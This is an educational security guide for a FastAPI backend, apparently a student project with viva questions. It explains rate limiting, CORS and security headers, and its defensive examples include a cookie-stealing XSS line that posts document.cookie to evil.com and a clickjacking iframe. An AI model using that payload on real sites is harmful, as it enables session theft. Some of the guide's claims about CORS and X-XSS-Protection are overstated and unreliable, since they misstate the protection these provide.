# Security Setup Guide

## Overview

This guide explains the security improvements added to the PricePilot FastAPI backend.

---

## 🔒 Security Features Implemented

### 1. Rate Limiting (slowapi)
### 2. Restricted CORS Origins
### 3. Security Headers

---

## 1️⃣ Rate Limiting

### What is Rate Limiting?

**Rate limiting** restricts the number of requests a client can make in a given time period.

**Why we need it:**
- Prevents brute force attacks (trying many passwords)
- Prevents spam (creating many fake accounts)
- Protects server resources
- Improves API stability

### Implementation

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

# Initialize rate limiter
limiter = Limiter(key_func=get_remote_address)

# Add to FastAPI app
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```

### Rate Limits Applied

| Endpoint | Limit | Reason |
|----------|-------|--------|
| `/auth/login` | 5 requests/minute | Prevents brute force password attacks |
| `/auth/register` | 3 requests/minute | Prevents spam account creation |

### How It Works

```python
@router.post("/login")
@limiter.limit("5/minute")
async def login(request: Request):
    # Login logic here
    pass
```

**Example:**
1. User tries to login 5 times in 1 minute → ✅ Allowed
2. User tries 6th time → ❌ Returns 429 (Too Many Requests)
3. After 1 minute passes → ✅ Can try again

### Rate Limit Response

When limit is exceeded:
```json
{
  "error": "Rate limit exceeded: 5 per 1 minute"
}
```

HTTP Status Code: **429 Too Many Requests**

---

## 2️⃣ Restricted CORS Origins

### What is CORS?

**CORS** (Cross-Origin Resource Sharing) controls which websites can access your API.

### Before (Insecure)

```python
allow_origins=["*"]  # Any website can access the API
```

**Problem:** Any malicious website could make requests to your API.

### After (Secure)

```python
allow_origins=[
    "http://localhost:8081",   # Expo default port
    "http://localhost:19006",  # Expo web port
]
```

**Benefit:** Only your React Native app can access the API.

### How It Works

```
┌──────────────────┐                    ┌──────────────────┐
│  Your Mobile App │                    │  FastAPI Server  │
│  localhost:8081  │                    │  localhost:8000  │
└────────┬─────────┘                    └────────┬─────────┘
         │                                       │
         │  1. Request with Origin header        │
         │  Origin: http://localhost:8081        │
         ├──────────────────────────────────────►│
         │                                       │
         │                                       │ 2. Check if origin
         │                                       │    is in allow_origins
         │                                       │
         │  3. Response with CORS headers        │
         │  Access-Control-Allow-Origin:         │
         │  http://localhost:8081                │
         │◄──────────────────────────────────────┤
         │                                       │
         │  4. Browser allows response           │
         │                                       │
```

```
┌──────────────────┐                    ┌──────────────────┐
│  Malicious Site  │                    │  FastAPI Server  │
│  evil.com        │                    │  localhost:8000  │
└────────┬─────────┘                    └────────┬─────────┘
         │                                       │
         │  1. Request with Origin header        │
         │  Origin: http://evil.com              │
         ├──────────────────────────────────────►│
         │                                       │
         │                                       │ 2. Check if origin
         │                                       │    is in allow_origins
         │                                       │    ❌ NOT ALLOWED
         │  3. Response WITHOUT CORS headers     │
         │◄──────────────────────────────────────┤
         │                                       │
         │  4. Browser BLOCKS response           │
         │                                       │
```

### For Production

When deploying to production, update to your actual domain:

```python
allow_origins=[
    "https://your-app.com",
    "https://www.your-app.com",
]
```

---

## 3️⃣ Security Headers

### What are Security Headers?

**Security headers** are HTTP response headers that tell browsers how to behave for security.

### Headers Added

```python
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    return response
```

### Header Explanations

#### 1. X-Content-Type-Options: nosniff

**What it does:**
- Prevents browsers from guessing file types (MIME-sniffing)
- Forces browser to respect the Content-Type header

**Attack it prevents:**
```
Attacker uploads file: malicious.jpg
File is actually: JavaScript code
Without nosniff: Browser might execute it as JavaScript
With nosniff: Browser treats it as image only
```

**Example:**
```
Without nosniff:
- Upload "image.jpg" (actually contains JavaScript)
- Browser detects JavaScript and executes it
- Attacker's code runs on your site

With nosniff:
- Upload "image.jpg" (actually contains JavaScript)
- Browser sees Content-Type: image/jpeg
- Browser refuses to execute it as JavaScript
- Attack blocked ✅
```

#### 2. X-Frame-Options: DENY

**What it does:**
- Prevents your website from being displayed in an iframe
- Protects against clickjacking attacks

**Attack it prevents (Clickjacking):**
```
1. Attacker creates malicious website
2. Embeds your login page in invisible iframe
3. Overlays fake buttons on top
4. User thinks they're clicking "Download Free Game"
5. Actually clicking "Transfer Money" on your site
```

**Example:**
```html
<!-- Attacker's malicious site -->
<iframe src="https://your-bank.com/transfer" style="opacity: 0">
</iframe>
<button style="position: absolute; top: 100px;">
  Download Free Game
</button>

<!-- User clicks button, actually clicks transfer button in iframe -->
```

**With X-Frame-Options: DENY:**
- Browser refuses to load your site in iframe
- Attack blocked ✅

#### 3. X-XSS-Protection: 1; mode=block

**What it does:**
- Enables browser's built-in XSS (Cross-Site Scripting) filter
- Blocks page if XSS attack is detected

**Attack it prevents (XSS):**
```
Attacker injects malicious script:
<script>
  // Steal user's cookies
  fetch('http://evil.com/steal?cookie=' + document.cookie)
</script>
```

**Example:**
```
Without XSS Protection:
- Attacker posts comment: <script>alert('Hacked!')</script>
- Script executes when other users view the comment
- Can steal cookies, passwords, etc.

With XSS Protection:
- Browser detects suspicious script
- Blocks the entire page from loading
- Shows error message
- Attack blocked ✅
```

---

## 🎓 Viva Questions & Answers

### Q1: What is rate limiting and why do we use it?
**A:** 
- **Rate limiting** restricts the number of requests per time period
- **Why we use it:**
  - Prevents brute force attacks (trying many passwords)
  - Prevents spam (creating fake accounts)
  - Protects server resources
  - Improves API stability

### Q2: What rate limits did you apply?
**A:** 
- **Login endpoint**: 5 requests per minute
  - Prevents brute force password attacks
- **Register endpoint**: 3 requests per minute
  - Prevents spam account creation

### Q3: What happens when rate limit is exceeded?
**A:** 
- Returns HTTP status code **429 (Too Many Requests)**
- Error message: "Rate limit exceeded: 5 per 1 minute"
- User must wait before trying again

### Q4: What is CORS and why restrict it?
**A:** 
- **CORS** = Cross-Origin Resource Sharing
- Controls which websites can access your API
- **Why restrict:**
  - Prevents malicious websites from accessing your API
  - Only your mobile app can make requests
  - Protects user data

### Q5: What origins did you allow?
**A:** 
- `http://localhost:8081` - Expo default port
- `http://localhost:19006` - Expo web port
- These are the ports where React Native app runs during development

### Q6: What is X-Content-Type-Options: nosniff?
**A:** 
- Prevents browsers from guessing file types
- Forces browser to respect Content-Type header
- **Protects against:** Drive-by download attacks
- **Example:** Prevents uploaded "image.jpg" that's actually JavaScript from executing

### Q7: What is X-Frame-Options: DENY?
**A:** 
- Prevents website from being displayed in an iframe
- **Protects against:** Clickjacking attacks
- **Example:** Attacker can't embed your login page in invisible iframe to trick users

### Q8: What is X-XSS-Protection: 1; mode=block?
**A:** 
- Enables browser's XSS (Cross-Site Scripting) filter
- Blocks page if XSS attack is detected
- **Protects against:** Malicious scripts injected into pages
- **Example:** Blocks `<script>` tags in user comments

### Q9: What is clickjacking?
**A:** 
- Attack where attacker tricks user into clicking something different than what they think
- **How it works:**
  1. Attacker embeds your site in invisible iframe
  2. Overlays fake buttons on top
  3. User thinks they're clicking "Download"
  4. Actually clicking "Transfer Money"
- **Prevention:** X-Frame-Options: DENY

### Q10: What is XSS (Cross-Site Scripting)?
**A:** 
- Attack where attacker injects malicious JavaScript into your website
- **Example:** Attacker posts comment with `<script>` tag
- Script executes when other users view the comment
- Can steal cookies, passwords, session tokens
- **Prevention:** X-XSS-Protection header + input validation

### Q11: How does slowapi track rate limits?
**A:** 
- Uses client's IP address (`get_remote_address`)
- Tracks number of requests per IP per time window
- Stores count in memory
- Resets counter after time window expires

### Q12: What is the difference between 401 and 429 status codes?
**A:** 
- **401 Unauthorized**: Invalid credentials (wrong password)
- **429 Too Many Requests**: Rate limit exceeded (too many attempts)

---

## 🔧 Testing Security Features

### Test Rate Limiting

**Test login rate limit (5/minute):**
```bash
# Make 6 requests quickly
for i in {1..6}; do
  curl -X POST http://localhost:8000/auth/login
  echo "Request $i"
done

# First 5 should succeed
# 6th should return 429
```

**Expected output:**
```
Request 1: 200 OK
Request 2: 200 OK
Request 3: 200 OK
Request 4: 200 OK
Request 5: 200 OK
Request 6: 429 Too Many Requests
```

### Test CORS

**Test allowed origin:**
```bash
curl -H "Origin: http://localhost:8081" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS http://localhost:8000/auth/login

# Should return CORS headers
```

**Test blocked origin:**
```bash
curl -H "Origin: http://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS http://localhost:8000/auth/login

# Should NOT return CORS headers
```

### Test Security Headers

```bash
curl -I http://localhost:8000/

# Should see in response:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
```

---

## 📊 Security Comparison

### Before Security Improvements

```
❌ No rate limiting
   - Unlimited login attempts
   - Vulnerable to brute force attacks

❌ CORS allows all origins (*)
   - Any website can access API
   - Vulnerable to CSRF attacks

❌ No security headers
   - Vulnerable to clickjacking
   - Vulnerable to XSS attacks
   - Vulnerable to MIME-sniffing
```

### After Security Improvements

```
✅ Rate limiting enabled
   - 5 login attempts per minute
   - 3 registrations per minute
   - Protected from brute force

✅ CORS restricted to specific origins
   - Only mobile app can access
   - Protected from CSRF attacks

✅ Security headers added
   - X-Content-Type-Options: nosniff
   - X-Frame-Options: DENY
   - X-XSS-Protection: 1; mode=block
   - Protected from multiple attack vectors
```

---

## 🐛 Troubleshooting

### Issue: "429 Too Many Requests" during development
**Cause**: Hit rate limit while testing  
**Fix**: 
1. Wait 1 minute for limit to reset
2. Or temporarily increase limits in code
3. Or use different IP address

### Issue: CORS error in mobile app
**Cause**: Mobile app running on different port  
**Fix**: Add the port to `allow_origins` list

### Issue: Security headers not appearing
**Cause**: Middleware not registered correctly  
**Fix**: Ensure middleware is added before routes

---

## 📚 Summary

✅ **Rate limiting** - Prevents brute force and spam  
✅ **Restricted CORS** - Only mobile app can access API  
✅ **Security headers** - Protects against multiple attacks  

Your API is now significantly more secure!

---

## 🔐 Additional Security Recommendations

For production, also consider:

1. **HTTPS only** - Use SSL/TLS certificates
2. **JWT token expiration** - Short-lived tokens (15-30 minutes)
3. **Password requirements** - Minimum length, complexity
4. **Input validation** - Validate all user input
5. **SQL injection prevention** - Use parameterized queries (already done!)
6. **Logging and monitoring** - Track suspicious activity
7. **Environment variables** - Never commit secrets to Git (already done!)
8. **Regular updates** - Keep dependencies up to date
